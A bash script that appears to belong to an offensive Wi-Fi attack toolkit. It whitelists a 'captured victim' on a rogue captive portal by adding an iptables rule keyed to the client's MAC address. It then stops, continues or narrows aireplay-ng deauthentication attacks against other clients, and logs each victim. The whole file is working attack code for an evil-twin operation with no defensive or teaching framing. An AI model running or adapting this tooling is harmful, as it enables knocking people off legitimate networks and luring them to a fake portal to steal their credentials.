#!/bin/bash
# Whitelist a client MAC for passthrough (bypass portal redirect)
# Usage: ./whitelist_client.sh <IP_ADDRESS>

if [ -z "$1" ]; then
    echo "Usage: ./whitelist_client.sh <IP_ADDRESS>"
    exit 1
fi

CLIENT_IP="$1"
INTERFACE="alfa0"
DEAUTH_MODE_FILE="/tmp/deauth_mode.txt"
LOG_FILE="/home/ov3rr1d3/wifi_arsenal/captures/passthrough_clients.log"

# Get MAC address from ARP table
CLIENT_MAC=$(arp -n "$CLIENT_IP" 2>/dev/null | grep -v "incomplete" | awk '{print $3}' | grep -E "([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}")

if [ -z "$CLIENT_MAC" ]; then
    echo "[-] Could not find MAC for IP $CLIENT_IP"
    exit 1
fi

echo "[+] Whitelisting client: IP=$CLIENT_IP MAC=$CLIENT_MAC"

# Insert ACCEPT rule at top of PREROUTING chain (before REDIRECT rules)
sudo iptables -t nat -I PREROUTING 1 -i $INTERFACE -m mac --mac-source $CLIENT_MAC -j ACCEPT

# Log the whitelisted client
echo "$(date '+%Y-%m-%d %H:%M:%S') - Whitelisted: IP=$CLIENT_IP MAC=$CLIENT_MAC" >> "$LOG_FILE"

echo "[+] Client $CLIENT_MAC now has internet access"

# Read deauth mode
DEAUTH_MODE="single"
if [ -f "$DEAUTH_MODE_FILE" ]; then
    DEAUTH_MODE=$(cat "$DEAUTH_MODE_FILE")
fi

echo "[*] Deauth mode: $DEAUTH_MODE"

case "$DEAUTH_MODE" in
    "single")
        # SINGLE VICTIM MODE: Stop deauth completely
        if [ -f /tmp/deauth_pid.txt ]; then
            DEAUTH_PID=$(cat /tmp/deauth_pid.txt)
            if ps -p $DEAUTH_PID > /dev/null 2>&1; then
                echo "[+] SINGLE MODE: Stopping deauth (victim captured)"
                kill $DEAUTH_PID 2>/dev/null
                pkill -f "aireplay-ng.*deauth" 2>/dev/null
                echo "$(date '+%Y-%m-%d %H:%M:%S') - Deauth stopped (single mode)" >> "$LOG_FILE"
            fi
        fi
        ;;
    
    "multi")
        # MULTI VICTIM MODE: Keep deauth running
        echo "[+] MULTI MODE: Deauth continues (capturing more victims)"
        echo "$(date '+%Y-%m-%d %H:%M:%S') - Deauth continues (multi mode)" >> "$LOG_FILE"
        ;;
    
    "smart")
        # SMART MODE: Switch to smart deauth (only deauth non-connected clients)
        echo "[+] SMART MODE: Switching to selective deauth"
        
        # Kill current broadcast deauth
        if [ -f /tmp/deauth_pid.txt ]; then
            DEAUTH_PID=$(cat /tmp/deauth_pid.txt)
            kill $DEAUTH_PID 2>/dev/null
            pkill -f "aireplay-ng.*deauth" 2>/dev/null
        fi
        
        # Start smart deauth in background
        DEAUTH_TARGET=$(cat /tmp/deauth_target.txt 2>/dev/null)
        if [ -n "$DEAUTH_TARGET" ]; then
            nohup /home/ov3rr1d3/wifi_arsenal/scripts/smart_deauth.sh "$DEAUTH_TARGET" > /tmp/smart_deauth.log 2>&1 &
            echo $! > /tmp/deauth_pid.txt
            echo "[+] Smart deauth started"
            echo "$(date '+%Y-%m-%d %H:%M:%S') - Switched to smart deauth" >> "$LOG_FILE"
        fi
        ;;
esac

echo "[+] Passthrough complete - victim has internet"
